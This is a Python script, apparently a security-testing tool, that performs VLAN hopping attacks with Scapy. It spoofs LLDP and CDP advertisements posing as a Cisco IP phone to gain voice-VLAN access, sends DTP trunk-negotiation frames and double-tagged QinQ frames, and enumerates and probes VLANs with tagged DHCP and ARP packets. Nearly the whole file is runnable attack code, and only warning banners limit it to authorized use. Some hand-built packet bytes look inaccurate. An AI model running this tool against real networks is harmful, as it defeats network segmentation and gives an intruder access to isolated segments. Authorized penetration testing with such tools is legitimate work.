#!/usr/bin/env python3
"""
VLAN Hopping Security Testing Tool
==================================
WARNING: Only use on networks you own or have explicit written permission to test.
"""

import sys
import os
import time
import argparse
import subprocess
import threading
import signal
import json
from datetime import datetime
import netifaces
import socket
import struct

try:
    from scapy.all import *
    from scapy.layers.l2 import Ether, Dot1Q
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dhcp import DHCP, BOOTP
except ImportError:
    print("Error: Scapy not found. Install with: pip3 install scapy")
    sys.exit(1)

class VLANHoppingTester:
    def __init__(self, interface):
        self.interface = interface
        self.results = {}
        self.running = True
        self.discovered_vlans = set()
        self.voice_vlans = set()
        
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print("\n[!] Stopping tests...")
        self.running = False
        
    def check_interface_status(self):
        """Check if interface exists and is suitable for testing"""
        try:
            if self.interface not in netifaces.interfaces():
                return False, f"Interface {self.interface} not found"
            
            # Check if interface is up
            result = subprocess.run(['ip', 'link', 'show', self.interface], 
                                  capture_output=True, text=True)
            if 'UP' not in result.stdout:
                return False, f"Interface {self.interface} is down"
                
            return True, "Interface ready"
        except Exception as e:
            return False, f"Error checking interface: {e}"
    
    def get_interface_info(self):
        """Get current interface configuration"""
        try:
            # Get IP configuration
            addrs = netifaces.ifaddresses(self.interface)
            
            # Check for trunk/VLAN configuration
            result = subprocess.run(['ip', 'link', 'show', self.interface], 
                                  capture_output=True, text=True)
            
            info = {
                'name': self.interface,
                'mac': addrs.get(netifaces.AF_LINK, [{}])[0].get('addr', 'Unknown'),
                'ip': addrs.get(netifaces.AF_INET, [{}])[0].get('addr', 'None'),
                'is_trunk': 'trunk' in result.stdout.lower() or 'vlan' in result.stdout.lower(),
                'raw_config': result.stdout
            }
            
            return info
        except Exception as e:
            return {'error': str(e)}
    
    def discover_vlans_passive(self, timeout=30):
        """Passively discover VLANs by monitoring tagged traffic"""
        print(f"[*] Starting passive VLAN discovery on {self.interface} for {timeout} seconds...")
        
        discovered = set()
        
        def packet_handler(packet):
            if not self.running:
                return
                
            if packet.haslayer(Dot1Q):
                vlan_id = packet[Dot1Q].vlan
                if vlan_id not in discovered:
                    discovered.add(vlan_id)
                    print(f"[+] Discovered VLAN: {vlan_id}")
        
        try:
            sniff(iface=self.interface, prn=packet_handler, timeout=timeout, store=0)
            self.discovered_vlans.update(discovered)
            return discovered
        except Exception as e:
            print(f"[-] Error in passive discovery: {e}")
            return set()
    
    def test_trunk_interface(self):
        """Test if current interface is configured as trunk with access to multiple VLANs"""
        print("[*] Testing trunk interface configuration...")
        
        test_vlans = range(1, 100)  # Test common VLAN range
        accessible_vlans = []
        
        for vlan_id in test_vlans:
            if not self.running:
                break
                
            try:
                # Create VLAN-tagged packet
                packet = Ether()/Dot1Q(vlan=vlan_id)/IP(dst="8.8.8.8")/ICMP()
                
                # Send packet and listen for response
                response = sr1(packet, timeout=1, verbose=0, iface=self.interface)
                
                if response:
                    accessible_vlans.append(vlan_id)
                    print(f"[+] VLAN {vlan_id} accessible via trunk")
                    
            except Exception as e:
                if "Operation not permitted" in str(e):
                    print(f"[-] Need root privileges for VLAN testing")
                    break
                continue
        
        self.results['trunk_test'] = accessible_vlans
        return accessible_vlans
    
    def spoof_lldp_phone(self, target_vlan=None):
        """Spoof LLDP to appear as an IP phone and attempt voice VLAN access"""
        print("[*] Starting LLDP spoofing to simulate IP phone...")
        
        # Get interface MAC
        interface_info = self.get_interface_info()
        source_mac = interface_info.get('mac', '02:00:00:00:00:01')
        
        # Create LLDP packet mimicking Cisco IP phone
        lldp_packet = Ether(src=source_mac, dst="01:80:c2:00:00:0e") / Raw(load=(
            b'\x02\x07\x04' + source_mac.replace(':', '').encode()[:6] +  # Chassis ID
            b'\x04\x07\x03' + source_mac.replace(':', '').encode()[:6] +  # Port ID  
            b'\x06\x02\x00\x78' +  # TTL (120 seconds)
            b'\x08\x17Cisco IP Phone 7965\x00' +  # System Name
            b'\x0a\x0dIP Phone\x00' +  # System Description
            b'\x0c\x25' +  # System Capabilities
            b'\x01\x04\x00\x01\x00\x01' +  # Phone capabilities
            b'\x00\x00'  # End of LLDPDU
        ))
        
        print(f"[*] Sending LLDP phone advertisement on {self.interface}")
        try:
            sendp(lldp_packet, iface=self.interface, verbose=0)
            
            # Wait and monitor for voice VLAN assignment
            time.sleep(5)
            print("[*] Monitoring for voice VLAN assignment...")
            
            def monitor_voice_vlan(packet):
                if packet.haslayer(Dot1Q):
                    vlan_id = packet[Dot1Q].vlan
                    # Common voice VLAN ranges
                    if 100 <= vlan_id <= 199 or 200 <= vlan_id <= 299:
                        self.voice_vlans.add(vlan_id)
                        print(f"[+] Potential voice VLAN detected: {vlan_id}")
            
            sniff(iface=self.interface, prn=monitor_voice_vlan, timeout=15, store=0)
            
        except Exception as e:
            print(f"[-] LLDP spoofing error: {e}")
        
        return list(self.voice_vlans)
    
    def spoof_cdp_phone(self):
        """Spoof CDP to appear as Cisco IP phone"""
        print("[*] Starting CDP spoofing to simulate Cisco IP phone...")
        
        interface_info = self.get_interface_info()
        source_mac = interface_info.get('mac', '02:00:00:00:00:01')
        
        # Create CDP packet
        cdp_packet = Ether(src=source_mac, dst="01:00:0c:cc:cc:cc") / LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(OUI=0x00000c, code=0x2000) / Raw(load=(
            b'\x02'  # CDP Version 2
            b'\x78'  # TTL (120 seconds)
            b'\x00\x00'  # Checksum (will be calculated)
            # Device ID TLV
            b'\x00\x01\x00\x16SEP' + source_mac.replace(':', '').upper().encode() +
            # Software Version TLV  
            b'\x00\x05\x00\x20Cisco IP Phone 7965 Software\x00' +
            # Platform TLV
            b'\x00\x06\x00\x15Cisco IP Phone 7965\x00' +
            # Capabilities TLV (Phone + Switch)
            b'\x00\x04\x00\x08\x00\x00\x00\x28' +
            # VoIP VLAN Query TLV
            b'\x00\x0e\x00\x07\x01\x01\x00'
        ))
        
        try:
            sendp(cdp_packet, iface=self.interface, verbose=0)
            print("[+] CDP phone advertisement sent")
            
            # Monitor for CDP responses that might indicate voice VLAN
            time.sleep(5)
            
        except Exception as e:
            print(f"[-] CDP spoofing error: {e}")
    
    def test_qinq_double_tagging(self, outer_vlan=None, inner_vlan=None):
        """Test QinQ (802.1ad) double VLAN tagging"""
        print("[*] Testing QinQ double VLAN tagging...")
        
        # Use discovered VLANs or defaults
        outer_vlans = [outer_vlan] if outer_vlan else [1, 10, 100, 200]
        inner_vlans = [inner_vlan] if inner_vlan else list(self.discovered_vlans) or [1, 10, 20, 50]
        
        successful_combinations = []
        
        for outer in outer_vlans:
            for inner in inner_vlans:
                if not self.running:
                    break
                    
                try:
                    # Create double-tagged packet
                    packet = (Ether() / 
                             Dot1Q(vlan=outer) / 
                             Dot1Q(vlan=inner) / 
                             IP(dst="8.8.8.8") / 
                             ICMP())
                    
                    response = sr1(packet, timeout=2, verbose=0, iface=self.interface)
                    
                    if response:
                        successful_combinations.append((outer, inner))
                        print(f"[+] QinQ success: Outer VLAN {outer}, Inner VLAN {inner}")
                        
                except Exception as e:
                    continue
        
        self.results['qinq_test'] = successful_combinations
        return successful_combinations
    
    def enumerate_vlans_dhcp(self, vlan_range=None):
        """Enumerate VLANs using DHCP discovery"""
        print("[*] Enumerating VLANs using DHCP discovery...")
        
        vlan_range = vlan_range or range(1, 200)
        active_vlans = []
        
        for vlan_id in vlan_range:
            if not self.running:
                break
                
            try:
                # Create DHCP discover packet with VLAN tag
                discover = (Ether(dst="ff:ff:ff:ff:ff:ff") / 
                           Dot1Q(vlan=vlan_id) / 
                           IP(src="0.0.0.0", dst="255.255.255.255") /
                           UDP(sport=68, dport=67) /
                           BOOTP(chaddr=RandString(6)) /
                           DHCP(options=[("message-type", "discover"), "end"]))
                
                # Send and wait for DHCP response
                response = sr1(discover, timeout=3, verbose=0, iface=self.interface)
                
                if response and response.haslayer(DHCP):
                    active_vlans.append(vlan_id)
                    print(f"[+] Active VLAN found via DHCP: {vlan_id}")
                    
            except Exception as e:
                continue
        
        self.results['dhcp_enum'] = active_vlans
        return active_vlans
    
    def test_dtp_negotiation(self):
        """Test Dynamic Trunking Protocol negotiation"""
        print("[*] Testing DTP (Dynamic Trunking Protocol) negotiation...")
        
        try:
            # Create DTP packet to negotiate trunk
            dtp_packet = (Ether(dst="01:00:0c:cc:cc:cc") / 
                         LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                         SNAP(OUI=0x00000c, code=0x2004) /
                         Raw(load=b'\x01'  # DTP Version
                                  b'\x02\x00\x05\x00\x01'  # Domain TLV
                                  b'\x03\x00\x05\x00\x81'  # Status TLV (Dynamic Desirable)
                                  b'\x04\x00\x05\x00\xa5'  # Type TLV (ISL)
                                  b'\x05\x00\x08' + b'\x00' * 6  # Neighbor TLV
                                  ))
            
            sendp(dtp_packet, iface=self.interface, verbose=0)
            print("[+] DTP negotiation packet sent")
            
            # Monitor for DTP responses
            time.sleep(10)
            
        except Exception as e:
            print(f"[-] DTP testing error: {e}")
    
    def monitor_spanning_tree(self, timeout=30):
        """Monitor Spanning Tree Protocol for VLAN information"""
        print(f"[*] Monitoring STP/RSTP for VLAN discovery ({timeout}s)...")
        
        stp_vlans = set()
        
        def stp_handler(packet):
            if packet.haslayer(LLC) and packet[LLC].dsap == 0x42:
                # STP/RSTP packet
                if packet.haslayer(Dot1Q):
                    vlan_id = packet[Dot1Q].vlan
                    stp_vlans.add(vlan_id)
                    print(f"[+] STP VLAN detected: {vlan_id}")
        
        try:
            sniff(iface=self.interface, prn=stp_handler, timeout=timeout, 
                 filter="ether dst 01:80:c2:00:00:00", store=0)
        except Exception as e:
            print(f"[-] STP monitoring error: {e}")
        
        return stp_vlans
    
    def test_vlan_injection(self, target_vlans=None):
        """Test injection into discovered VLANs"""
        print("[*] Testing VLAN injection capabilities...")
        
        target_vlans = target_vlans or list(self.discovered_vlans) or [1, 10, 20, 50, 100]
        injection_results = {}
        
        for vlan_id in target_vlans:
            if not self.running:
                break
                
            print(f"[*] Testing injection into VLAN {vlan_id}...")
            
            try:
                # Test ARP injection
                arp_packet = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                             Dot1Q(vlan=vlan_id) /
                             ARP(op=1, pdst=f"192.168.{vlan_id}.1"))
                
                response = sr1(arp_packet, timeout=3, verbose=0, iface=self.interface)
                
                injection_results[vlan_id] = {
                    'arp_response': response is not None,
                    'timestamp': datetime.now().isoformat()
                }
                
                if response:
                    print(f"[+] VLAN {vlan_id} injection successful")
                
            except Exception as e:
                injection_results[vlan_id] = {'error': str(e)}
        
        self.results['injection_test'] = injection_results
        return injection_results
    
    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'interface': self.interface,
            'interface_info': self.get_interface_info(),
            'discovered_vlans': list(self.discovered_vlans),
            'voice_vlans': list(self.voice_vlans),
            'test_results': self.results,
            'summary': {
                'total_vlans_found': len(self.discovered_vlans),
                'voice_vlans_found': len(self.voice_vlans),
                'trunk_accessible': len(self.results.get('trunk_test', [])) > 0,
                'qinq_vulnerable': len(self.results.get('qinq_test', [])) > 0
            }
        }
        
        return report
    
    def save_results(self, filename=None):
        """Save results to JSON file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vlan_hopping_results_{timestamp}.json"
        
        report = self.generate_report()
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Results saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving results: {e}")

def list_interfaces():
    """List available network interfaces"""
    print("\nAvailable network interfaces:")
    for interface in netifaces.interfaces():
        try:
            addrs = netifaces.ifaddresses(interface)
            mac = addrs.get(netifaces.AF_LINK, [{}])[0].get('addr', 'No MAC')
            ip = addrs.get(netifaces.AF_INET, [{}])[0].get('addr', 'No IP')
            print(f"  {interface:<12} MAC: {mac:<17} IP: {ip}")
        except:
            print(f"  {interface:<12} (Unable to read details)")

def check_requirements():
    """Check if running as root and required tools are available"""
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        print("    Run with: sudo python3 vlan_hopping_tester.py")
        return False
    
    # Check for required tools with appropriate flags
    required_checks = [
        ('ip', ['-V']),  # iproute2 uses -V for version
        ('ethtool', ['--version'])
    ]
    missing_tools = []
    
    for tool, version_args in required_checks:
        try:
            result = subprocess.run([tool] + version_args, 
                                  capture_output=True, text=True, timeout=5)
            # For 'ip', even error code might be OK if it shows version info
            if tool == 'ip' and ('iproute2' in result.stderr or 'ip utility' in result.stderr or result.returncode == 0):
                continue
            elif result.returncode == 0:
                continue
            else:
                missing_tools.append(tool)
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
        print("    Install with: sudo apt update && sudo apt install iproute2 ethtool")
        return False
    
    return True

def main():
    parser = argparse.ArgumentParser(
        description="VLAN Hopping Security Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 vlan_hopping_tester.py -i eth0 --full-test
  python3 vlan_hopping_tester.py -i wlan0 --passive-only --timeout 60
  python3 vlan_hopping_tester.py -i eth1 --test-qinq --outer-vlan 100
  python3 vlan_hopping_tester.py --list-interfaces

WARNING: Only use on networks you own or have written authorization to test.
        """)
    
    parser.add_argument('-i', '--interface', help='Network interface to use')
    parser.add_argument('--list-interfaces', action='store_true', 
                       help='List available interfaces and exit')
    parser.add_argument('--passive-only', action='store_true',
                       help='Only perform passive monitoring (non-intrusive)')
    parser.add_argument('--full-test', action='store_true',
                       help='Run all available tests')
    parser.add_argument('--test-trunk', action='store_true',
                       help='Test trunk interface access')
    parser.add_argument('--test-lldp', action='store_true',
                       help='Test LLDP phone spoofing')
    parser.add_argument('--test-cdp', action='store_true',
                       help='Test CDP phone spoofing')
    parser.add_argument('--test-qinq', action='store_true',
                       help='Test QinQ double tagging')
    parser.add_argument('--test-dhcp-enum', action='store_true',
                       help='Enumerate VLANs using DHCP')
    parser.add_argument('--timeout', type=int, default=30,
                       help='Timeout for passive discovery (default: 30)')
    parser.add_argument('--outer-vlan', type=int,
                       help='Outer VLAN for QinQ testing')
    parser.add_argument('--inner-vlan', type=int,
                       help='Inner VLAN for QinQ testing')
    parser.add_argument('--vlan-range', help='VLAN range for enumeration (e.g., 1-100)')
    parser.add_argument('--output', help='Output file for results')
    
    args = parser.parse_args()
    
    # Check requirements
    if not check_requirements():
        print("[!] Warning: Some tools may not be available, but continuing...")
        print("    If you encounter errors, install missing tools with:")
        print("    sudo apt install iproute2 ethtool")
        time.sleep(3)
    
    # List interfaces if requested
    if args.list_interfaces:
        list_interfaces()
        sys.exit(0)
    
    # Validate interface
    if not args.interface:
        print("[-] Interface required. Use --list-interfaces to see available options.")
        sys.exit(1)
    
    # Create tester instance
    tester = VLANHoppingTester(args.interface)
    
    # Set up signal handler for graceful exit
    signal.signal(signal.SIGINT, tester.signal_handler)
    
    # Check interface status
    status, msg = tester.check_interface_status()
    if not status:
        print(f"[-] {msg}")
        sys.exit(1)
    
    print(f"[+] Using interface: {args.interface}")
    print(f"[+] Interface status: {msg}")
    
    try:
        # Determine which tests to run
        if args.full_test:
            tests_to_run = ['passive', 'trunk', 'lldp', 'cdp', 'qinq', 'dhcp_enum', 'stp']
        elif args.passive_only:
            tests_to_run = ['passive', 'stp']
        else:
            tests_to_run = []
            if args.test_trunk: tests_to_run.append('trunk')
            if args.test_lldp: tests_to_run.append('lldp')
            if args.test_cdp: tests_to_run.append('cdp')
            if args.test_qinq: tests_to_run.append('qinq')
            if args.test_dhcp_enum: tests_to_run.append('dhcp_enum')
            
            if not tests_to_run:
                tests_to_run = ['passive']  # Default to passive discovery
        
        print(f"\n[*] Starting VLAN hopping security assessment...")
        print(f"[*] Tests to run: {', '.join(tests_to_run)}")
        print("[*] Press Ctrl+C to stop\n")
        
        # Run selected tests
        if 'passive' in tests_to_run:
            tester.discover_vlans_passive(args.timeout)
        
        if 'stp' in tests_to_run:
            stp_vlans = tester.monitor_spanning_tree(15)
            tester.discovered_vlans.update(stp_vlans)
        
        if 'trunk' in tests_to_run:
            tester.test_trunk_interface()
        
        if 'lldp' in tests_to_run:
            tester.spoof_lldp_phone()
        
        if 'cdp' in tests_to_run:
            tester.spoof_cdp_phone()
        
        if 'qinq' in tests_to_run:
            tester.test_qinq_double_tagging(args.outer_vlan, args.inner_vlan)
        
        if 'dhcp_enum' in tests_to_run:
            vlan_range = None
            if args.vlan_range:
                start, end = map(int, args.vlan_range.split('-'))
                vlan_range = range(start, end + 1)
            tester.enumerate_vlans_dhcp(vlan_range)
        
        # Test injection into discovered VLANs
        if tester.discovered_vlans and not args.passive_only:
            tester.test_vlan_injection()
        
        # Generate and display report
        print("\n" + "="*60)
        print("VLAN HOPPING SECURITY ASSESSMENT REPORT")
        print("="*60)
        
        report = tester.generate_report()
        
        print(f"Interface: {report['interface']}")
        print(f"MAC Address: {report['interface_info'].get('mac', 'Unknown')}")
        print(f"Current IP: {report['interface_info'].get('ip', 'None')}")
        print(f"VLANs Discovered: {len(report['discovered_vlans'])}")
        if report['discovered_vlans']:
            print(f"  - VLAN IDs: {sorted(report['discovered_vlans'])}")
        
        if report['voice_vlans']:
            print(f"Voice VLANs Found: {sorted(report['voice_vlans'])}")
        
        # Security findings
        print("\nSecurity Findings:")
        if report['summary']['trunk_accessible']:
            print("  [!] CRITICAL: Trunk interface access detected")
        
        if report['summary']['qinq_vulnerable']:
            print("  [!] WARNING: QinQ double tagging successful")
        
        if report['discovered_vlans']:
            print(f"  [!] INFO: {len(report['discovered_vlans'])} VLANs discoverable")
        
        if not any([report['summary']['trunk_accessible'], 
                   report['summary']['qinq_vulnerable'],
                   report['discovered_vlans']]):
            print("  [+] No obvious VLAN hopping vulnerabilities detected")
        
        # Save results
        tester.save_results(args.output)
        
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
    except Exception as e:
        print(f"[-] Error during testing: {e}")
    finally:
        print("\n[*] VLAN hopping assessment completed")

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║                   VLAN Hopping Testing Tool                   ║
║                                                              ║
║  WARNING: For authorized security testing only!              ║
║  Ensure you have written permission before testing.         ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    main()
